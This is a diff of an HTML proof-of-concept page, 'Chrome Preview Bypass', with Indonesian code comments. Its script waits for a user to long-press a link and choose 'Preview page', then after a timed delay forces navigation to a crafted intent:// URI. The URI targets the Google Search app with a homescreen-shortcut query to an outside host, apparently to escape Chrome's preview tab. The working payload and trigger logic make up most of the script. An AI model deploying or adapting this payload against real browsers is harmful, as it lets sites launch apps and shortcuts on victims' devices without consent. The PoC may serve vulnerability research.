@@ -2,13 +2,22 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Android Intent Stable PoC</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Android Intent Ultimate PoC</title>
   <style>
+    :root {
+      --bg: #0f172a;
+      --card: #1e293b;
+      --accent: #3b82f6;
+      --accent-hover: #2563eb;
+      --text: #f8fafc;
+      --text-muted: #94a3b8;
+    }
+
     body {
       font-family: system-ui, -apple-system, sans-serif;
-      background: #f8f9fa;
-      color: #202124;
+      background: var(--bg);
+      color: var(--text);
       min-height: 100vh;
       margin: 0;
       display: grid;
@@ -17,83 +26,109 @@
       padding: 20px;
     }
 
-    .card {
-      background: white;
-      padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
-      max-width: 400px;
+    .wrapper {
+      background: var(--card);
+      padding: 35px 28px;
+      border-radius: 16px;
+      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3), 0 8px 10px -6px rgba(0, 0, 0, 0.3);
+      max-width: 380px;
+      width: 100%;
+      border: 1px solid rgba(255, 255, 255, 0.05);
     }
 
-    a {
-      display: inline-block;
-      padding: 16px 28px;
-      background: #1a73e8;
+    h2 {
+      margin-top: 0;
+      font-size: 1.3rem;
+      letter-spacing: -0.025em;
+    }
+
+    p {
+      color: var(--text-muted);
+      font-size: 0.9rem;
+      line-height: 1.4;
+      margin-bottom: 24px;
+    }
+
+    .target-btn {
+      display: block;
+      width: 100%;
+      box-sizing: border-box;
+      padding: 16px;
+      background: var(--accent);
       color: white;
       text-decoration: none;
       font-weight: 600;
+      font-size: 0.95rem;
+      border-radius: 10px;
+      transition: background 0.2s, transform 0.1s;
+      box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
+    }
+
+    .target-btn:active {
+      background: var(--accent-hover);
+      transform: scale(0.98);
+    }
+
+    .hud {
+      margin-top: 20px;
+      padding: 10px;
+      background: rgba(15, 23, 42, 0.6);
       border-radius: 8px;
-      margin-top: 15px;
-      transition: background 0.2s;
-    }
-
-    a:active {
-      background: #1557b0;
-    }
-
-    #status {
-      margin-top: 15px;
-      font-size: 13px;
-      color: #5f6368;
+      font-family: monospace;
+      font-size: 0.75rem;
+      color: #38bdf8;
+      border: 1px solid rgba(56, 189, 248, 0.1);
     }
   </style>
 </head>
 <body>
 
-  <div class="card">
-    <h2>Android Intent PoC</h2>
-    <p>Long-press the link below, then select <b>Preview page</b>.</p>
+  <div class="wrapper">
+    <h2>Chrome Preview Bypass</h2>
+    <p>Long-press target, select <b>Preview page</b>, and watch the system dialog hook.</p>
     
-    <a href="https://google.com" id="intentLink">
-      Test Link Preview Intent
+    <!-- Target link dengan rel dan atribut penunjang pointer -->
+    <a href="https://www.google.com" id="pocLink" class="target-btn">
+      Trigger Intent Payload
     </a>
 
-    <div id="status">Status: Ready</div>
+    <div class="hud" id="hudStatus">HUD: IDLE - Waiting for long-press</div>
   </div>
 
   <script>
-    const link = document.getElementById("intentLink");
-    const statusEl = document.getElementById("status");
-    let isTriggered = false;
+    const link = document.getElementById("pocLink");
+    const hud = document.getElementById("hudStatus");
+    let state = 0; // 0: Idle, 1: Armed, 2: Executing
 
-    // Memastikan touch event terdeteksi dengan baik di perangkat seluler
-    link.addEventListener("touchstart", () => {
-      if (!isTriggered) {
-        statusEl.textContent = "Status: Touch detected...";
+    const payloadIntent = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
+
+    // Optimasi penangkapan event pointer & touch awal
+    link.addEventListener("pointerdown", () => {
+      if (state === 0) {
+        state = 1;
+        hud.textContent = "HUD: Pointer down detected...";
       }
     }, { passive: true });
 
+    // Pemicu utama berbasis contextmenu (terpicu saat long-press menu opsi muncul)
     link.addEventListener("contextmenu", (e) => {
-      if (isTriggered) return;
-      isTriggered = true;
+      if (state === 2) return;
+      state = 2;
+      
+      hud.textContent = "HUD: Context menu captured. T-2500ms...";
 
-      statusEl.textContent = "Status: Context menu opened. Waiting for preview...";
-
-      // Delay yang disesuaikan (2500ms memberikan waktu optimal bagi Ephemeral Tab untuk terbuka)
+      // Jeda presisi tinggi untuk memberi waktu render Ephemeral Tab
       setTimeout(() => {
-        statusEl.textContent = "Status: Executing Intent trigger!";
+        hud.textContent = "HUD: Injecting Intent URI...";
         
-        const intentUrl =
-          "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
+        // Eksekusi pemaksaan intent navigasi eksternal dari background context
+        window.location.href = payloadIntent;
 
-        // Eksekusi navigasi Intent dari latar belakang
-        window.location.href = intentUrl;
-
-        // Reset state setelah jeda tertentu untuk pengujian berulang
+        // Reset siklus state otomatis setelah jeda eksekusi selesai
         setTimeout(() => {
-          isTriggered = false;
-          statusEl.textContent = "Status: Ready (Reset)";
-        }, 1500);
+          state = 0;
+          hud.textContent = "HUD: State reset. Ready again.";
+        }, 1200);
 
       }, 2500);
     });
